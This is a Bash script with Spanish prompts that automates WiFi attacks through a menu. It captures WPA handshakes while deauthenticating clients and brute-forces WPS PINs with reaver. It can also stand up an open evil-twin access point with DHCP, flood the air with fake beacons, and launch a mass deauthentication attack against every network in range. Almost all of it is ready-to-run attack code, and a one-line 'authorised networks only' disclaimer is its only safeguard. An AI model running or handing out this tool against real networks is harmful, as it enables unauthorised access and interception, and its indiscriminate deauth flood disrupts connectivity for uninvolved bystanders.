#!/bin/bash

# 🚀 WiFi Pentesting Automation Script
# Uso: ./wifi_automation.sh [opcion]

INTERFACE="wlan0"
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

print_banner() {
    echo -e "${BLUE}"
    echo "██╗    ██╗██╗███████╗██╗    ██████╗ ███████╗███╗   ██╗████████╗███████╗███████╗████████╗"
    echo "██║    ██║██║██╔════╝██║    ██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝"
    echo "██║ █╗ ██║██║█████╗  ██║    ██████╔╝█████╗  ██╔██╗ ██║   ██║   █████╗  ███████╗   ██║   "
    echo "██║███╗██║██║██╔══╝  ██║    ██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  ╚════██║   ██║   "
    echo "╚███╔███╔╝██║██║     ██║    ██║     ███████╗██║ ╚████║   ██║   ███████╗███████║   ██║   "
    echo " ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝    ╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚══════╝   ╚═╝   "
    echo -e "${NC}"
    echo -e "${YELLOW}🎯 WiFi Pentesting Automation Tool con AWUS036ACH${NC}"
    echo -e "${RED}⚠️  Solo para fines educativos y redes autorizadas${NC}"
    echo ""
}

check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}❌ Este script necesita permisos de root${NC}"
        echo -e "Ejecuta con: ${YELLOW}sudo $0${NC}"
        exit 1
    fi
}

check_interface() {
    if ! iwconfig $INTERFACE &> /dev/null; then
        echo -e "${RED}❌ Interface $INTERFACE no encontrada${NC}"
        echo -e "Interfaces disponibles:"
        iwconfig 2>&1 | grep -E "^[a-zA-Z]" | cut -d' ' -f1
        exit 1
    fi
    echo -e "${GREEN}✅ Interface $INTERFACE encontrada${NC}"
}

setup_monitor_mode() {
    echo -e "${YELLOW}🔧 Configurando modo monitor...${NC}"
    airmon-ng check kill &> /dev/null
    airmon-ng start $INTERFACE &> /dev/null
    echo -e "${GREEN}✅ Modo monitor activado${NC}"
}

basic_recon() {
    echo -e "${YELLOW}📡 Iniciando reconocimiento básico...${NC}"
    setup_monitor_mode
    
    echo -e "Escaneando redes (60 segundos)..."
    timeout 60 airodump-ng $INTERFACE --band abg -w recon_$(date +%Y%m%d_%H%M%S) > /dev/null 2>&1
    
    echo -e "${YELLOW}📊 Verificando WPS...${NC}"
    timeout 30 wash -i $INTERFACE > wps_scan_$(date +%Y%m%d_%H%M%S).txt 2>/dev/null
    
    echo -e "${GREEN}✅ Reconocimiento completado. Revisa los archivos generados.${NC}"
}

targeted_attack() {
    read -p "🎯 BSSID objetivo: " target_bssid
    read -p "📡 Canal: " target_channel
    
    if [[ -z "$target_bssid" || -z "$target_channel" ]]; then
        echo -e "${RED}❌ BSSID y canal son requeridos${NC}"
        return 1
    fi
    
    setup_monitor_mode
    
    echo -e "${YELLOW}🎯 Atacando $target_bssid en canal $target_channel${NC}"
    
    # Terminal para capturar handshake
    gnome-terminal --title="Captura Handshake" -- bash -c "
        echo 'Capturando handshake...';
        airodump-ng -c $target_channel --bssid $target_bssid -w handshake_$(date +%Y%m%d_%H%M%S) $INTERFACE;
        echo 'Presiona Enter para continuar...'; read;
    " &
    
    sleep 5
    
    # Terminal para deauth attack
    gnome-terminal --title="Deauth Attack" -- bash -c "
        echo 'Iniciando ataque de deauth...';
        echo 'Presiona Ctrl+C para detener';
        aireplay-ng -0 0 -a $target_bssid $INTERFACE;
        echo 'Presiona Enter para continuar...'; read;
    " &
    
    echo -e "${GREEN}✅ Ataque iniciado en terminales separadas${NC}"
}

wps_attack() {
    echo -e "${YELLOW}🔓 Buscando objetivos WPS...${NC}"
    setup_monitor_mode
    
    wash -i $INTERFACE > wps_targets_temp.txt 2>/dev/null &
    wash_pid=$!
    
    echo -e "Escaneando WPS (30 segundos)..."
    sleep 30
    kill $wash_pid 2>/dev/null
    
    if [[ -s wps_targets_temp.txt ]]; then
        echo -e "${GREEN}🎯 Objetivos WPS encontrados:${NC}"
        cat wps_targets_temp.txt
        echo ""
        
        read -p "BSSID para atacar: " wps_bssid
        read -p "Canal: " wps_channel
        
        if [[ -n "$wps_bssid" && -n "$wps_channel" ]]; then
            echo -e "${YELLOW}🔨 Iniciando ataque WPS con Reaver...${NC}"
            reaver -i $INTERFACE -b $wps_bssid -c $wps_channel -vv
        fi
    else
        echo -e "${RED}❌ No se encontraron objetivos WPS${NC}"
    fi
    
    rm -f wps_targets_temp.txt
}

evil_twin() {
    read -p "📡 SSID para clonar: " evil_ssid
    read -p "🌐 Canal: " evil_channel
    
    if [[ -z "$evil_ssid" ]]; then
        evil_ssid="Free_WiFi"
    fi
    
    if [[ -z "$evil_channel" ]]; then
        evil_channel="6"
    fi
    
    setup_monitor_mode
    
    # Crear configuración hostapd
    cat > /tmp/evil_hostapd.conf << EOF
interface=$INTERFACE
driver=nl80211
ssid=$evil_ssid
hw_mode=g
channel=$evil_channel
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=0
EOF
    
    echo -e "${YELLOW}👹 Iniciando Evil Twin AP: $evil_ssid${NC}"
    
    # Terminal para hostapd
    gnome-terminal --title="Evil Twin AP" -- bash -c "
        echo 'Iniciando Evil Twin: $evil_ssid';
        hostapd /tmp/evil_hostapd.conf;
        echo 'Presiona Enter para continuar...'; read;
    " &
    
    sleep 3
    
    # Configurar DHCP
    gnome-terminal --title="DHCP Server" -- bash -c "
        echo 'Iniciando servidor DHCP...';
        dnsmasq -C /dev/null -kd -F 192.168.4.100,192.168.4.200,12h -i $INTERFACE --bind-dynamic;
        echo 'Presiona Enter para continuar...'; read;
    " &
    
    echo -e "${GREEN}✅ Evil Twin iniciado. Monitorea las terminales.${NC}"
}

beacon_spam() {
    read -p "¿Cuántos SSIDs falsos crear? (default: 20): " ssid_count
    
    if [[ -z "$ssid_count" ]]; then
        ssid_count=20
    fi
    
    setup_monitor_mode
    
    echo -e "${YELLOW}📡 Generando $ssid_count SSIDs falsos...${NC}"
    
    # Crear lista de SSIDs falsos divertidos
    cat > /tmp/fake_ssids.txt << EOF
FBI Surveillance Van
NSA Listening Post
Free WiFi - Click Here
COVID-19 Test Results
Your WiFi is Mine
404 Network Not Found
Virus Distribution Center
Definitely Not FBI
Putin's Network
Area 51 Research
Password is 123456
Yell Penis for Password
Pretty Fly for a WiFi
Wu Tang LAN
LAN Solo
The LAN Before Time
Bill Wi the Science Fi
WiFi Art Thou Romeo
Silence of the LANs
Harry Potter WiFi
EOF
    
    echo -e "${YELLOW}💀 Iniciando Beacon Spam...${NC}"
    echo -e "${RED}Presiona Ctrl+C para detener${NC}"
    
    mdk4 $INTERFACE b -f /tmp/fake_ssids.txt -g
}

deauth_all() {
    echo -e "${YELLOW}📡 Escaneando objetivos...${NC}"
    setup_monitor_mode
    
    # Escaneo rápido para encontrar objetivos
    timeout 10 airodump-ng $INTERFACE --band abg -w quick_scan > /dev/null 2>&1
    
    if [[ -f quick_scan-01.csv ]]; then
        echo -e "${GREEN}🎯 Redes encontradas:${NC}"
        awk -F, '/^[A-Fa-f0-9:]{17}/ {print $1 " - " $14}' quick_scan-01.csv | head -10
        echo ""
        
        read -p "¿Atacar TODAS las redes? (y/N): " confirm
        
        if [[ $confirm == [yY] ]]; then
            echo -e "${RED}💥 ATAQUE MASIVO DE DEAUTH INICIADO${NC}"
            echo -e "${YELLOW}Presiona Ctrl+C para detener${NC}"
            
            # Deauth flood general
            mdk4 $INTERFACE d &
            
            # También ataques dirigidos
            while IFS=, read -r bssid channel rest; do
                if [[ $bssid =~ ^[A-Fa-f0-9:]{17}$ ]]; then
                    aireplay-ng -0 5 -a $bssid $INTERFACE &
                fi
            done < quick_scan-01.csv
            
            wait
        fi
    fi
    
    rm -f quick_scan*
}

show_help() {
    echo -e "${BLUE}📚 Ayuda - Opciones disponibles:${NC}"
    echo ""
    echo -e "  ${YELLOW}1.${NC} Reconocimiento básico"
    echo -e "  ${YELLOW}2.${NC} Ataque dirigido (Handshake)"
    echo -e "  ${YELLOW}3.${NC} Ataque WPS"
    echo -e "  ${YELLOW}4.${NC} Evil Twin AP"
    echo -e "  ${YELLOW}5.${NC} Beacon Spam"
    echo -e "  ${YELLOW}6.${NC} Deauth masivo"
    echo -e "  ${YELLOW}7.${NC} Esta ayuda"
    echo -e "  ${YELLOW}0.${NC} Salir"
    echo ""
}

cleanup() {
    echo -e "\n${YELLOW}🧹 Limpiando...${NC}"
    airmon-ng stop $INTERFACE &> /dev/null
    rm -f /tmp/evil_hostapd.conf /tmp/fake_ssids.txt
    echo -e "${GREEN}✅ Limpieza completada${NC}"
}

# Función principal
main() {
    print_banner
    check_root
    check_interface
    
    # Trap para cleanup
    trap cleanup EXIT INT TERM
    
    while true; do
        echo ""
        echo -e "${BLUE}╔══════════════════════════════════════╗${NC}"
        echo -e "${BLUE}║${NC}          ${YELLOW}MENÚ PRINCIPAL${NC}              ${BLUE}║${NC}"
        echo -e "${BLUE}╠══════════════════════════════════════╣${NC}"
        echo -e "${BLUE}║${NC} ${YELLOW}1.${NC} Reconocimiento básico           ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${YELLOW}2.${NC} Ataque dirigido (Handshake)     ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${YELLOW}3.${NC} Ataque WPS                      ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${YELLOW}4.${NC} Evil Twin AP                    ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${YELLOW}5.${NC} Beacon Spam                     ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${YELLOW}6.${NC} Deauth masivo                   ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${YELLOW}7.${NC} Ayuda                           ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${YELLOW}0.${NC} Salir                           ${BLUE}║${NC}"
        echo -e "${BLUE}╚══════════════════════════════════════╝${NC}"
        
        read -p "Selecciona una opción: " choice
        
        case $choice in
            1) basic_recon ;;
            2) targeted_attack ;;
            3) wps_attack ;;
            4) evil_twin ;;
            5) beacon_spam ;;
            6) deauth_all ;;
            7) show_help ;;
            0) echo -e "${GREEN}👋 ¡Hasta luego!${NC}"; break ;;
            *) echo -e "${RED}❌ Opción inválida${NC}" ;;
        esac
    done
}

# Ejecutar script principal
main "$@"